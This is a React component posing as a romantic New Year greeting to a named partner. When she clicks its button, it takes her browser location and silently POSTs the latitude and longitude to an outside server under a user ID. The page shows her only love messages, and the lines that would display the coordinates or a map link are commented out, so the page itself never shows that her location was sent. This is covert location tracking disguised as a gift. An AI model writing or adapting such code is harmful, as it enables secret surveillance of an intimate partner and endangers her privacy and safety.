import React, { useState } from "react";

const LocationSender = () => {
  const [status, setStatus] = useState("");
  const [coords, setCoords] = useState(null);

  const sendLocation = async (latitude, longitude) => {
    try {
      const res = await fetch("https://messageweb-njt9.onrender.com/location", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          userId: "pratham",
          latitude,
          longitude,
        }),
      });

      const data = await res.json();
      console.log("Server response:", data);
      setStatus("I Love You Bauua ❤️🥰");
    } catch (err) {
      console.error(err);
      setStatus("You did something wrong⚠");
    }
  };

  const handleSendLocation = () => {
    if (!navigator.geolocation) {
      setStatus("Geolocation not supported by your browser");
      return;
    }

    setStatus("📍 Getting Started Beautiful");

    navigator.geolocation.getCurrentPosition(
        (position) => {
            const { latitude, longitude } = position.coords;
            setCoords({ latitude, longitude });
            sendLocation(latitude, longitude);
        },
        (error) => {
            console.error(error);

            if (error.code === error.PERMISSION_DENIED) {
            setStatus("⚠️ You denied location. Please enable it in browser settings.");
            } else if (error.code === error.POSITION_UNAVAILABLE) {
            setStatus("❌ Location unavailable. Turn on GPS or check network.");
            } else if (error.code === error.TIMEOUT) {
            setStatus("⌛ Location request timed out. Try again.");
            } else {
            setStatus("❌ Unknown error getting location.");
            }
        }
    );
  };

  return (
    <div style={{ textAlign: "center", marginTop: "3rem" }}>
      <h1>Janta hu nhi hu tumhare pass par karta hu ab bhi tumse hi pyar ate hai sapne tumhare raat me kya ho nhi sakti tum mere sath me.💞</h1>
      <button
        onClick={handleSendLocation}
        style={{
          background: "#2563eb",
          color: "#fff",
          border: "none",
          padding: "10px 20px",
          borderRadius: "8px",
          cursor: "pointer",
          fontSize: "1rem",
        }}
      >
        Click Here 🥰
      </button>

      <p style={{ marginTop: "1rem" }}>{status}</p>

      {coords && (
        <div style={{ marginTop: "1rem" }}>
          <p>
            {/* <strong>Latitude:</strong> {coords.latitude} */}
            {coords.latitude && (
              <div>
  <h3 className="luv-title">Happy New Year 2026, Annu — my Baccha, my Bauua 🎆</h3>

<p className="luv-sub">
  As this new year begins, I just want you to know — you are my favorite part of every
  day and my biggest blessing in every year.  
  2025 was beautiful because of you, and I you choose me in 2026 and promise me to be my betu forever i will make you smile, laugh, and take care of you rest of my life.  

  I wish this year brings you calm mornings, peaceful nights, endless happiness,
  and everything your heart truly deserves.  
  No matter where life takes us, I promise to keep choosing you — in every moment,
  in every season, in every year.  

  Take care of yourself a little more this year, okay?  
  You mean the world to me, today and always ❤️
</p>

<button
  className="luv-btn"
  title="Play message for Annu"
>
  Cheers to Us — 2026 ❤️
</button>

<div className="luv-small">
  Tip: Drink more water, smile more often, and never forget how deeply you are loved.  
  Happy New Year, my betu ❤️
</div>
</div>

)}
          </p>
          <p>
            {/* <strong>Longitude:</strong> {coords.longitude} */}
          </p>
          {/* <a
            href={`https://www.google.com/maps?q=${coords.latitude},${coords.longitude}`}
            target="_blank"
            rel="noreferrer"
          >
            🌍 View on Google Maps
          </a> */}
        </div>
      )}
    </div>
  );
};

export default LocationSender;
